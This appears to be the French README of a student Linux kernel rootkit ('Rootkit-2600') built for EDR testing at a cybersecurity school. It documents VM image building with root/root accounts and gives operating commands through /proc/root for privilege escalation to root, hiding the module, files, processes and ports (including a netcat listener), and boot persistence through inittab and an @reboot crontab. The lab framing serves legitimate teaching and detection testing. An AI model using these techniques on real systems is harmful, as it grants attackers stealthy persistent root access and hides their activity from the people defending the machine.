# Rootkit-2600

Rootkit kernel module pour tests EDR — 2600 École de Cybersécurité 2026.

---

## Comptes LFS

| Compte | Login | Mot de passe |
|--------|-------|--------------|
| root   | root  | root         |
| user   | 2600  | root         |

---

## Build

```bash
make
```

```bash
make clean
```

---

## Construire l'image LFS

> Nécessite : `parted`, `losetup`, `mkfs.ext4`, `docker`, `grub` (i386-pc), `qemu-img`

```bash
sudo ./build_image.sh [disk.raw] [disk.qcow2]
```

Le script :
1. Crée une image disque de 450 Mo (MSDOS + ext4 bootable)
2. Monte la partition via loopback
3. Peuple avec Alpine Linux via Docker (packages, comptes, rootkit)
4. Compile le rootkit contre les headers du noyau Alpine-LTS
5. Installe GRUB (i386-pc)
6. Convertit en qcow2

### Variante LFS minimale (rapide)

Construit une image Alpine bootable (GRUB + kernel `linux-lts`) avec les 2 comptes demandés, sans étape de compilation longue :

```bash
sudo ./lfs/build_lfs.sh out/disk.raw out/disk.qcow2
```

## Lancer la VM

```bash
qemu-system-x86_64 -m 512M -drive file=disk.qcow2,format=qcow2 -nographic
```

Avec débogage GDB :

```bash
qemu-system-x86_64 -m 512M -drive file=disk.qcow2,format=qcow2 -nographic -s -S
# Dans un autre terminal :
gdb
(gdb) target remote localhost:1234
```

---

## Charger le module

```bash
insmod rootkit.ko
lsmod | grep rootkit
dmesg | tail
```

---

## Tests

### Privesc

Avec companion :
```bash
./companion root
./companion root 1337
```

Sans companion :
```bash
echo 0 > /proc/root          # root sur le processus courant
echo 1337 > /proc/root       # root sur le pid 1337
id                            # uid=0(root)
```

### Hide / show module

Avec companion :
```bash
./companion hide
lsmod | grep rootkit

./companion show
lsmod | grep rootkit
```

Sans companion :
```bash
echo hide > /proc/root
lsmod | grep rootkit   # plus rien

echo show > /proc/root
lsmod | grep rootkit   # de retour
```

### Cacher un fichier

Les fichiers avec le préfixe `r2600_` sont cachés automatiquement.

```bash
touch /tmp/r2600_test
ls /tmp
```

Par nom exact, avec companion :
```bash
./companion hidefile secret.txt
./companion clearfile
```

Sans companion :
```bash
echo hidefile:secret.txt > /proc/root
ls                             # secret.txt invisible

echo clearfile > /proc/root
ls                             # secret.txt visible
```

### Cacher un processus

Avec companion :
```bash
sleep 9999 &
./companion hideproc $!
ls /proc | grep $!
```

Sans companion :
```bash
sleep 9999 &
PID=$!
echo hideproc:$PID > /proc/root
ls /proc | grep $PID           # plus rien
```

### Cacher un port

Avec companion :
```bash
nc -lvp 4444 &
./companion hideport 4444
cat /proc/net/tcp
```

Sans companion :
```bash
nc -lvp 4444 &
echo hideport:4444 > /proc/root
cat /proc/net/tcp              # port 4444 absent
```

### Persistance

Au chargement, le module essaie deux méthodes de persistence dans l'ordre :
1. écriture dans `/etc/inittab` (init BusyBox)
2. écriture dans `/etc/crontabs/root` avec `@reboot` (cron BusyBox)

Si inittab échoue (fichier absent selon le système) il tente le cron, les deux sont indépendants.

**Vérifier via dmesg :**

```bash
dmesg | tail -20
# inittab ok :  ok la ligne est dans inittab
# inittab ko :  inittab échoué, on essaie le cron
# cron ok :     ok la ligne est dans le crontab
# cron ko :     cron aussi échoué, tant pis
```

**Vérifier inittab :**

```bash
grep insmod /etc/inittab
# ::sysinit:/sbin/insmod /root/rootkit.ko
```

**Vérifier le crontab :**

```bash
cat /etc/crontabs/root
# @reboot /sbin/insmod /root/rootkit.ko
```

**Vérifier la persistance après reboot :**

```bash
# charger le module
insmod rootkit.ko

# verifier que les deux entrées sont la
grep insmod /etc/inittab
grep insmod /etc/crontabs/root

# reboot
reboot

# apres redemarrage
lsmod | grep rootkit
dmesg | grep chargé
```

---

## Retirer le module

```bash
./companion show
rmmod rootkit
```

---

## Commandes /proc/root

| Commande           | Effet                                         |
|--------------------|-----------------------------------------------|
| `root`             | root sur le processus courant                 |
| `hide`             | cache le module (lsmod + /sys/module/)        |
| `show`             | rend le module visible                        |
| `hideproc:<pid>`   | ajoute un pid à cacher dans /proc (max 16)    |
| `clearprocs`       | vide la liste des pids cachés                 |
| `hidefile:<name>`  | ajoute un fichier à cacher par nom (max 16)   |
| `clearfiles`       | vide la liste des fichiers cachés             |
| `hideport:<port>`  | ajoute un port TCP+UDP à cacher (max 16)      |
| `clearports`       | vide la liste des ports cachés                |
